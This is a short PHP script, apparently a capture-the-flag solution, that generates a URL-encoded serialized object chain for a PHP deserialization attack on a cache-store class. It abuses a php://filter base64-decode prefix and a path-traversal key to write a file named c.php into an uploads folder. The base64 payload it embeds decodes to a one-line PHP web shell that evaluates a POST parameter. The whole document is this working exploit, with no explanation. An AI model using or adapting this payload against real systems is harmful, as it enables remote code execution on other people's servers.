<?php
class B{
    public $options;
    public function __construct()
    {
        $this->options['data_compress'] = false;
        $this->options['expire'] = 111;
        $this->options['serialize'] = 'strval';
        $this->options['prefix'] = 'php://filter/write=convert.base64-decode/resource=uploads/';
    }
}
class A {
    protected $store;
    protected $key;
    protected $expire;
    public function __construct()
    {
        $this->store = new B();
        $this->key = '/../c.php/.';
        $this->expire = 111;
    }
}
$a = new A();
$a->autosave=false;
$a->cache = array('111'=>array("path"=>"PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+"));
$a->complete = '2';
echo urlencode(serialize($a));